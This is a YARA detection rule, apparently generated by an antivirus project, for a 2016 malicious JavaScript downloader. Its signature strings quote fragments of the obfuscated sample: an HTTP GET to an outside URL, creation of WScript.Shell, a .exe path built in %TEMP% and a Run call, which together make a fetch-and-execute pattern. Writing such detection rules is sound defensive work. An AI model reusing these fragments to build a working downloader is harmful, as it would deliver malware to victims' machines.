rule sig_20160330_ebea8bab35ec57558bed57b6d4b27022 {
  meta:
    description = "datamaliciousorder - file 20160330_ebea8bab35ec57558bed57b6d4b27022.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "c2e393badf13d278dffaee205d2602208c9a7968d8f1a4fc76a3633a9d082231"

  strings:
    $s1  = "_Y[_J](\"GET\", \"http://linkownia.itcom.pl/s9aps\", false);" fullword ascii
    $s2  = "function _PL(_TJ, _R0){_W = _W * 1; return _TJ - _R0;};" fullword ascii
    $s3  = "var _BG = function _UO() {return WScript[_R](\"WScript\"+\".Shell\");}(), _UV = 11;" fullword ascii
    $s4  = "if (_Y[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function _LL() {return _BG[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"V7yvhb1Zss.ex\" + \"e\";};" fullword ascii
    $s6  = "function _Z(){return _C0 + \"\";};" fullword ascii
    $s7  = "function _DC(_O){_BG[\"Run\"](_O, _W, _W);};" fullword ascii
    $s8  = "function _BF() {return ((_L == true) && (_L == _P0)) ? 1 : _W;};" fullword ascii
    $s9  = " while (_P){" fullword ascii
    $s10 = "function _K()" fullword ascii
    $s11 = "function _E(_HF) {var _M0 = (1, 2, 3, 4, 5, _HF); return _M0;};" fullword ascii
    $s12 = "return _PL(_A, _B);" fullword ascii
    $s13 = "var _RR = new this[\"Date\"]();" fullword ascii
    $s14 = "function _LD(){return 22;};" fullword ascii
    $s15 = "function _DR(){return _R;};" fullword ascii
    $s16 = "var _L = false;" fullword ascii
    $s17 = "_L = true; " fullword ascii
    $s18 = "_P0 = true; " fullword ascii
    $s19 = "var _P0 = false;" fullword ascii
    $s20 = "var _F0 = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}